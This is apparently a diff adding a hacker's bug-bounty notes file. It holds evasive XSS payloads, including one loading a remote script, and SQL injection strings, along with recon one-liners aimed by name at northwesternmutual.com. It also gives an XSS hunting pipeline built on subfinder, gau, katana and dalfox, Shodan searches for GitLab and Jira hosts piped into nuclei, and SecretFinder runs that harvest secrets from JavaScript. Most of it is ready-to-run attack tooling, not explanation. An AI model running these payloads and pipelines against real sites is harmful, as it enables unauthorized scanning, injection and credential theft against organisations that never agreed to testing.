@@ -1,3 +1,59 @@
+<​script/src=//⑮.rs>
+<i/oncut​=alert()> (CTRL +X )
+<svg/onload​=alert()
+
+waymore -i northwesternmutual.com -mode U -xcc -c ~/.config.yml -oU ~/.config/waymore/results
+gau -subs northwesternmutual.com |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
+cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
+
+uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei
+uncover -q target -f ip | naabu
+echo jira | uncover -e shodan,censys -silent
+
+Xss 💰 Methodology 💯 
+
+
+1- Pick a target
+
+2- Do Full depth Subdomain enumeration using Subfinder( along API'S ) and use webcopilot or SubDomz and various subdomains finder tools in one liner and also ones perform subdomain bruteforicng and save it in a file.!! 
+
+3- subfinder -d example.com -all >> subs.txt
+
+4- cat subs.txt | httpx -o alive-subs.txt
+
+
+Method-1 ( Using Dalfox ) 
+1- katana -u alive-subs.txt -o endpoints-1.txt
+2- waybackurls http://example.com | grep = | tee endpoints-2.txt 
+3- ./gau example.com >> endpoints-3.txt
+4- paramspider -d example.com 
+5 - cat alive-subs.txt | hakrawler | tee -a endpoints-5.txt
+6- cat endpoints.txt | uro | tee -a endpoints-uro.txt ( Combine all URLS )
+7- cat endpoints-uro.txt | Gxss | dalfox pipe --multicast --skip-mining-all
+8- dalfox url http://example.com --custom-payload payloads.txt 
+
+Method-2 ( Using XSS_vibes ) 
+1- katana -u alive-subs.txt -o endpoints-1.txt
+2- waybackurls http://example.com | grep = | tee endpoints-2.txt 
+3- ./gau example.com >> endpoints-3.txt
+4- paramspider -d example.com 
+5 - cat alive-subs.txt | hakrawler | tee -a endpoints-5.txt
+6- cat endpoints.txt | uro | tee -a endpoints-uro.txt
+7- cat endpoints-uro.txt | ./gf xss | sed 's/=.*/=/' -o output.txt 
+8- python3 main.py -f input.txt -o <output>
+
+cat domains.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
+cat domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
+echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe 
+
+cat waymore.txt | grep -E -v '\.css($|\s|\?|&|#|/|\.)|\.js($|\s|\?|&|#|/|\.)|\.jpg($|\s|\?|&|#|/|\.)|\.JPG($|\s|\?|&|#|/|\.)|\.PNG($|\s|\?|&|#|/|\.)|\.GIF($|\s|\?|&|#|/|\.)|\.avi($|\s|\?|&|#|/|\.)|\.dll($|\s|\?|&|#|/|\.)|\.pl($|\s|\?|&|#|/|\.)|\.webm($|\s|\?|&|#|/|\.)|\.c($|\s|\?|&|#|/|\.)|\.py($|\s|\?|&|#|/|\.)|\.bat($|\s|\?|&|#|/|\.)|\.tar($|\s|\?|&|#|/|\.)|\.swp($|\s|\?|&|#|/|\.)|\.tmp($|\s|\?|&|#|/|\.)|\.sh($|\s|\?|&|#|/|\.)|\.deb($|\s|\?|&|#|/|\.)|\.exe($|\s|\?|&|#|/|\.)|\.zip($|\s|\?|&|#|/|\.)|\.mpeg($|\s|\?|&|#|/|\.)|\.mpg($|\s|\?|&|#|/|\.)|\.flv($|\s|\?|&|#|/|\.)|\.wmv($|\s|\?|&|#|/|\.)|\.wma($|\s|\?|&|#|/|\.)|\.aac($|\s|\?|&|#|/|\.)|\.m4a($|\s|\?|&|#|/|\.)|\.ogg($|\s|\?|&|#|/|\.)|\.mp4($|\s|\?|&|#|/|\.)|\.mp3($|\s|\?|&|#|/|\.)|\.bat($|\s|\?|&|#|/|\.)|\.dat($|\s|\?|&|#|/|\.)|\.cfg($|\s|\?|&|#|/|\.)|\.cfm($|\s|\?|&|#|/|\.)|\.bin($|\s|\?|&|#|/|\.)|\.jpeg($|\s|\?|&|#|/|\.)|\.JPEG($|\s|\?|&|#|/|\.)|\.ps.gz($|\s|\?|&|#|/|\.)|\.gz($|\s|\?|&|#|/|\.)|\.gif($|\s|\?|&|#|/|\.)|\.tif($|\s|\?|&|#|/|\.)|\.tiff($|\s|\?|&|#|/|\.)|\.csv($|\s|\?|&|#|/|\.)|\.png($|\s|\?|&|#|/|\.)|\.ttf($|\s|\?|&|#|/|\.)|\.ppt($|\s|\?|&|#|/|\.)|\.pptx($|\s|\?|&|#|/|\.)|\.ppsx($|\s|\?|&|#|/|\.)|\.doc($|\s|\?|&|#|/|\.)|\.woff($|\s|\?|&|#|/|\.)|\.xlsx($|\s|\?|&|#|/|\.)|\.xls($|\s|\?|&|#|/|\.)|\.mpp($|\s|\?|&|#|/|\.)|\.mdb($|\s|\?|&|#|/|\.)|\.json($|\s|\?|&|#|/|\.)|\.woff2($|\s|\?|&|#|/|\.)|\.icon($|\s|\?|&|#|/|\.)|\.pdf($|\s|\?|&|#|/|\.)|\.docx($|\s|\?|&|#|/|\.)|\.svg($|\s|\?|&|#|/|\.)|\.txt($|\s|\?|&|#|/|\.)|\.jar($|\s|\?|&|#|/|\.)|\.0($|\s|\?|&|#|/|\.)|\.1($|\s|\?|&|#|/|\.)|\.2($|\s|\?|&|#|/|\.)|\.3($|\s|\?|&|#|/|\.)|\.4($|\s|\?|&|#|/|\.)|\.m4r($|\s|\?|&|#|/|\.)|\.kml($|\s|\?|&|#|/|\.)|\.pro($|\s|\?|&|#|/|\.)|\.yao($|\s|\?|&|#|/|\.)|\.gcn3($|\s|\?|&|#|/|\.)|\.PDF($|\s|\?|&|#|/|\.)|\.egy($|\s|\?|&|#|/|\.)|\.par($|\s|\?|&|#|/|\.)|\.lin($|\s|\?|&|#|/|\.)|\.yht($|\s|\?|&|#|/|\.)' > filtered-extensions-links.txt
+
+uro -i filtered-extensions-links.txt -o uro.txt
+subprober -f uro.txt -sc -ar -o 1337.txt -nc -mc 200 301 302 307 308 403 -c 20
+cat uro.txt | gf or
+grep "=" urls.txt | sed 's/=\(.*\)/=/'
+
+
 'or 1=1 limit 1-- -
 '"()><img src="x"><a href="https://google.com">click</a>
 %22%27%3E%3CA%20HREF=%22http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D%22%3EXSS%3C/A%3E
